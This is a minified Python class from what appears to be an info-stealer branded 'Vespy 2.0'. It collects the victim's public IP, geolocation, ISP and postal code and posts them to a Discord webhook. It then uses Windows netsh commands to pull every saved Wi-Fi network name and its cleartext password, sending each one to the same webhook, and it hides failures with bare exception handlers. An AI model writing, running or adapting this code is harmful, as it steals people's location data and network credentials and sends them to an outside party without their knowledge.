class A:
	def __init__(A):A.WiFi()
	def IP(A):
		B=requests.get('http://ipinfo.io/json').json();A.ip=f"``{B['ip']}``"
		try:A.hostname=f"``{B['hostname']}``"
		except:A.hostname=':x:'
		A.city=f"``{B['city']}``";A.region=f"``{B['region']}``";A.country=f"``{B['country']}``";A.location=f"``{B['loc']}``";A.ISP=f"``{B['org']}``";A.postal=f"``{B['postal']}``"
	def WiFi(B):
		L='backslashreplace';K='utf-8';J='Beadiddd 2.0 | by : Beadiddd';I='author : Beadiddd';H='4300d1';G='Vespy 2.0';E='https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png';B.IP();C=DiscordWebhook(url=wbh,username=G,avatar_url=E);A=DiscordEmbed(title=f"Network Info",description=f"User's Network Info",color=H);A.set_author(name=I,icon_url=E);A.set_footer(text=J);A.set_timestamp();A.add_embed_field(name=f":ok_hand: IP : {B.ip}",value=f""":label: Hostname: {B.hostname}
:cityscape: City: {B.city}
:park: Region: {B.region}
:map: Country: {B.country}
:round_pushpin: Location: {B.location}
:pager: ISP: {B.ISP}
:envelope: Postal: {B.postal}""");C.add_embed(A);C.execute()
		try:
			M=re.findall('(?:Profile\\s*:\\s)(.*)',subprocess.check_output('netsh wlan show profiles',shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL).decode(K,errors=L))
			for D in M:D=D.replace('\\r\\n','');F=subprocess.check_output(f"netsh wlan show profile {D} key=clear",shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL).decode(K,errors=L);N=F.split('Type')[1].split(':')[1].split('\n')[0].split('\r')[0];O=F.split('Key Content')[1].split(':')[1].split('\n')[0].split('\r')[0];C=DiscordWebhook(url=wbh,username=G,avatar_url=E);A=DiscordEmbed(title=f"Network Info",description=f"User's Network Info (MORE)",color=H);A.set_author(name=I,icon_url=E);A.set_footer(text=J);A.set_timestamp();A.add_embed_field(name=f":thumbup: Wifi Network Found : ``{D}``",value=f":man_tipping_hand: SSID: ``{N}``\n:scream: Password: ``{O}``");C.add_embed(A);C.execute()
		except:pass